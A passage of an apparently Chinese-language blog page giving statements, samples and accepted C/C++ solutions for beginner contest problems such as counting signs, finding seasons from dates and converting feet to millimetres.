class="code"><pre><span class="line"><span class="number">2000</span></span><br></pre></td></tr></table></figure><h2 id="输出-20"><a href="#输出-20" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h1 id="示例2-8"><a href="#示例2-8" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-21"><a href="#输入-21" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1900</span></span><br></pre></td></tr></table></figure><h2 id="输出-21"><a href="#输出-21" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no</span><br></pre></td></tr></table></figure><h1 id="AC-Code-9"><a href="#AC-Code-9" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">400</span> == <span class="number">0</span> || n % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; n % <span class="number">100</span> != <span class="number">0</span>) cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="K-统计数据正负个数"><a href="#K-统计数据正负个数" class="headerlink" title="K 统计数据正负个数"></a>K 统计数据正负个数</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h1><p>输入10个整数，分别统计输出正数、负数的个数。</p><h1 id="输入描述-9"><a href="#输入描述-9" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入10个整数（范围-231~231-1），用空格分隔。</p><h1 id="输出描述-10"><a href="#输出描述-10" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>两行，第一行正数个数，第二行负数个数，具体格式见样例。</p><h1 id="示例1-10"><a href="#示例1-10" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-22"><a href="#输入-22" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">-6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">-1</span> <span class="number">6</span> <span class="number">8</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h2 id="输出-22"><a href="#输出-22" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">positive:<span class="number">7</span></span><br><span class="line">negative:<span class="number">3</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-10"><a href="#AC-Code-10" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> cnt1 = <span class="number">0</span>, cnt2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &gt; <span class="number">0</span>) cnt1 ++;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">0</span>) cnt2 ++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;positive:&quot;</span> &lt;&lt; cnt1 &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;negative:&quot;</span> &lt;&lt; cnt2 &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="L-小乐乐是否被叫家长"><a href="#L-小乐乐是否被叫家长" class="headerlink" title="L 小乐乐是否被叫家长"></a>L 小乐乐是否被叫家长</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 262144K，其他语言524288K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h1><p>小乐乐的班级进行了一次期中考试，考试一共有3门科目：数学，语文，英语，小乐乐的班主任决定给没有通过考核的同学家长开一次家长会，考核的标准是三科平均分不低于60分，所以现在想请你帮忙算一算小乐乐会不会被叫家长。<br>输入描述:<br>一行，输入三个整数（表示小乐乐的数学、语文、英语的成绩），用空格分隔。</p><h1 id="输出描述-11"><a href="#输出描述-11" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>一行，如果小乐乐会被请家长则输出“YES”，否则输出“NO”。</p><h1 id="示例1-11"><a href="#示例1-11" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-23"><a href="#输入-23" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">80</span> <span class="number">60</span> <span class="number">50</span></span><br></pre></td></tr></table></figure><h2 id="输出-23"><a href="#输出-23" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NO</span><br></pre></td></tr></table></figure><h1 id="示例2-9"><a href="#示例2-9" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-24"><a href="#输入-24" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">70</span> <span class="number">55</span> <span class="number">40</span></span><br></pre></td></tr></table></figure><h2 id="输出-24"><a href="#输出-24" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br></pre></td></tr></table></figure><h1 id="AC-Code-11"><a href="#AC-Code-11" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    <span class="keyword">if</span> ((a + b + c) / <span class="number">3</span> &gt;= <span class="number">60</span>) cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="M-最大最小值"><a href="#M-最大最小值" class="headerlink" title="M 最大最小值"></a>M 最大最小值</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h1><p>输入三个数，输出最大数，最小数</p><h1 id="输入描述-10"><a href="#输入描述-10" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入一行，包含三个整数a, b , c  （1 \le a,b,c \le 10000001≤a,b,c≤1000000）</p><h1 id="输出描述-12"><a href="#输出描述-12" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>输出两行，第一行输出最大数，第二行输出最小数。具体格式见样例输出。</p><h1 id="示例1-12"><a href="#示例1-12" class="headerlink" title="示例1"></a>示例1</h1><h1 id="输入-25"><a href="#输入-25" class="headerlink" title="输入"></a>输入</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h1 id="输出-25"><a href="#输出-25" class="headerlink" title="输出"></a>输出</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The maximum number is : <span class="number">3</span></span><br><span class="line">The minimum number is : <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-12"><a href="#AC-Code-12" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The maximum number is : &quot;</span> &lt;&lt; <span class="built_in">max</span>(&#123;a, b, c&#125;) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The minimum number is : &quot;</span> &lt;&lt; <span class="built_in">min</span>(&#123;a, b, c&#125;) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="N-送分题"><a href="#N-送分题" class="headerlink" title="N 送分题"></a>N 送分题</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h1><p>数据结构之神ccz又在出毒瘤数据结构了<br>神出了这样一个题：<br>给你三个数，在这三个数中间任意加<em>或者是+，然后可以随便打括号，只要这个表达式合法<br>比如说1 2 3可以得到：<br>1+2</em>3&#x3D;7<br>1*(2+3)&#x3D;5<br>1<em>2</em>3&#x3D;6<br>(1+2)*3&#x3D;9<br>不能改变这三个数的原顺序<br>最大化表达式的值</p><h1 id="输入描述-11"><a href="#输入描述-11" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入三行，每行一个数</p><p>分别表示a，b，c</p><h1 id="输出描述-13"><a href="#输出描述-13" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>输出一行一个数表示答案</p><h1 id="示例1-13"><a href="#示例1-13" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-26"><a href="#输入-26" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="输出-26"><a href="#输出-26" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure><h1 id="示例2-10"><a href="#示例2-10" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-27"><a href="#输入-27" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="输出-27"><a href="#输出-27" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">60</span></span><br></pre></td></tr></table></figure><h1 id="备注-3"><a href="#备注-3" class="headerlink" title="备注:"></a>备注:</h1><p>1 &lt;&#x3D; a , b , c &lt;&#x3D; 10</p><h1 id="AC-Code-13"><a href="#AC-Code-13" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> maxx;</span><br><span class="line">    maxx = a + b * c;</span><br><span class="line">    maxx = <span class="built_in">max</span>(maxx, a * (b + c));</span><br><span class="line">    maxx = <span class="built_in">max</span>(maxx, a * b * c);</span><br><span class="line">    maxx = <span class="built_in">max</span>(maxx, (a + b) * c);</span><br><span class="line">    maxx = <span class="built_in">max</span>(maxx, a + b + c);</span><br><span class="line">    cout &lt;&lt; maxx &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="O-四季"><a href="#O-四季" class="headerlink" title="O 四季"></a>O 四季</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 262144K，其他语言524288K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h1><p>气象意义上，通常以3～5月为春季(spring)，6～8月为夏季(summer)，9～11月为秋季(autumn)，12月～来年2月为冬季(winter)。请根据输入的年份以及月份，输出对应的季节。</p><h1 id="输入描述-12"><a href="#输入描述-12" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入的数据格式是固定的YYYYMM的形式，即：年份占4个数位，月份占2个数位。</p><h1 id="输出描述-14"><a href="#输出描述-14" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>输出月份对应的季节（用英文单词表示，全部用小写字母）。</p><h1 id="示例1-14"><a href="#示例1-14" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-28"><a href="#输入-28" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">201901</span></span><br></pre></td></tr></table></figure><h2 id="输出-28"><a href="#输出-28" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winter</span><br></pre></td></tr></table></figure><h1 id="备注-4"><a href="#备注-4" class="headerlink" title="备注:"></a>备注:</h1><p>输入的年份应该是4位数，输入的月份应该为1~12。</p><h1 id="AC-Code-14"><a href="#AC-Code-14" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    cin &gt;&gt; a;</span><br><span class="line">    b = a % <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (b &gt;= <span class="number">3</span> &amp;&amp; b &lt;= <span class="number">5</span>) cout &lt;&lt; <span class="string">&quot;spring&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (b &gt;= <span class="number">6</span> &amp;&amp; b &lt;= <span class="number">8</span>) cout &lt;&lt; <span class="string">&quot;summer&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (b &gt;= <span class="number">9</span> &amp;&amp; b &lt;= <span class="number">11</span>) cout &lt;&lt; <span class="string">&quot;autumn&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;winter&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="P-B是不是太迟了"><a href="#P-B是不是太迟了" class="headerlink" title="P B是不是太迟了"></a>P B是不是太迟了</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h1><p>众所周知，gplt选拔赛是在10月29号进行。那么大家在10月29号之前都可以训练自己的编程（为什么29号不能训练了呢，因为29号要睡懒觉^_^）。<br>想在，小金翻开了日历，他想知道今天还能不能训练，是不是太迟了。</p><h1 id="输入描述-13"><a href="#输入描述-13" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入一个字符串S(格式为yyyy&#x2F;mm&#x2F;dd)，保证在2020年并且日期合法。</p><h1 id="输出描述-15"><a href="#输出描述-15" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>没有太迟，还有时间训练，则输出:<br><code>No. It&#39;s not too late.</code></p><p>如果太迟了，输出:<br><code>QAQ</code></p><h1 id="示例1-15"><a href="#示例1-15" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-29"><a href="#输入-29" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">15</span></span><br></pre></td></tr></table></figure><h2 id="输出-29"><a href="#输出-29" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No. It<span class="number">&#x27;</span>s <span class="keyword">not</span> too late.</span><br></pre></td></tr></table></figure><h1 id="示例2-11"><a href="#示例2-11" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-30"><a href="#输入-30" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span>/<span class="number">11</span>/<span class="number">30</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-15"><a href="#AC-Code-15" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll y, m, d;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld/%lld/%lld&quot;</span>, &amp;y, &amp;m, &amp;d);</span><br><span class="line">    <span class="keyword">if</span> (y == <span class="number">2020</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m &lt; <span class="number">10</span> || m == <span class="number">10</span> &amp;&amp; d &lt; <span class="number">29</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;No. It&#x27;s not too late.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;QAQ&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;QAQ&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Q-前天是哪天"><a href="#Q-前天是哪天" class="headerlink" title="Q 前天是哪天"></a>Q 前天是哪天</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 262144K，其他语言524288K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h1><p>给定公元2000年到公元3000年之间的某一天，请你给出该天的前天是哪一天.</p><h1 id="输入描述-14"><a href="#输入描述-14" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入在一个日期，格式如”yyyy-mm-dd”，题目保证所有输入日期为合法日期。</p><h1 id="输出描述-16"><a href="#输出描述-16" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>在一行中输出日期，格式如”yyyy-mm-dd”。</p><h1 id="示例1-16"><a href="#示例1-16" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-31"><a href="#输入-31" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span><span class="number">-11</span><span class="number">-15</span></span><br></pre></td></tr></table></figure><h2 id="输出-30"><a href="#输出-30" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span><span class="number">-11</span><span class="number">-13</span></span><br></pre></td></tr></table></figure><h1 id="备注-5"><a href="#备注-5" class="headerlink" title="备注:"></a>备注:</h1><p>注意日期格式，月份或者天数不足2位要补零。</p><h1 id="AC-Code-16"><a href="#AC-Code-16" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> y, m, d;</span><br><span class="line"><span class="type">int</span> a[<span class="number">23</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;y, &amp;m, &amp;d);</span><br><span class="line"><span class="keyword">if</span> (y % <span class="number">400</span> == <span class="number">0</span> || (y % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; y % <span class="number">100</span> != <span class="number">0</span>)) a[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">if</span> (d &gt; <span class="number">2</span>) d -= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (-- m == <span class="number">0</span>) &#123;</span><br><span class="line">m = <span class="number">12</span>;</span><br><span class="line">y --;</span><br><span class="line">&#125;</span><br><span class="line">d = a[m] - <span class="number">2</span> + d;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d-%02d-%02d&quot;</span>, y, m, d);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="R-L1-2单位换算"><a href="#R-L1-2单位换算" class="headerlink" title="R L1-2单位换算"></a>R L1-2单位换算</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 262144K，其他语言524288K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h1><p>已知1英尺&#x3D;12英寸，1英寸&#x3D;2.54厘米，1厘米&#x3D;10毫米。</p><p>现在给你一个英尺数，请你换算成毫米。</p><h1 id="输入描述-15"><a href="#输入描述-15" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>第一行给定一个正整数 N ( 0 ≤ N ≤ 100 )，单位是英尺。</p><h1 id="输出描述-17"><a href="#输出描述-17" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>在一行中输出一个数，代表换算后的结果，单位为毫米。</p><p>若结果不为整数，只保留一位小数，末尾不要有多余的零。</p><h1 id="示例1-17"><a href="#示例1-17" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-32"><a href="#输入-32" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="输出-31"><a href="#输出-31" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1524</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-17"><a href="#AC-Code-17" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 